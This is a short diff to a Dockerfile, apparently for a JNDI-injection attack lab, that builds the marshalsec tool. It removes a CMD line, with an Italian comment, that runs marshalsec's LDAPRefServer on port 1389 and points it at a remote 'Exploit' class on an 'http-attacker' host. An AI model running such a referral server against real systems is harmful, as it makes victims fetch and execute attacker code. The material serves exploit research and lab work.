@@ -28,6 +28,3 @@ COPY --from=builder /marshalsec/target/marshalsec-0.0.3-SNAPSHOT-all.jar /app/ma
 WORKDIR /app
 
 EXPOSE 1389
-
-# Il CMD viene sovrascritto in docker-compose con l'URL corretto di http-attacker
-CMD ["java", "-cp", "marshalsec.jar", "marshalsec.jndi.LDAPRefServer", "http://http-attacker:8888/#Exploit", "1389"]
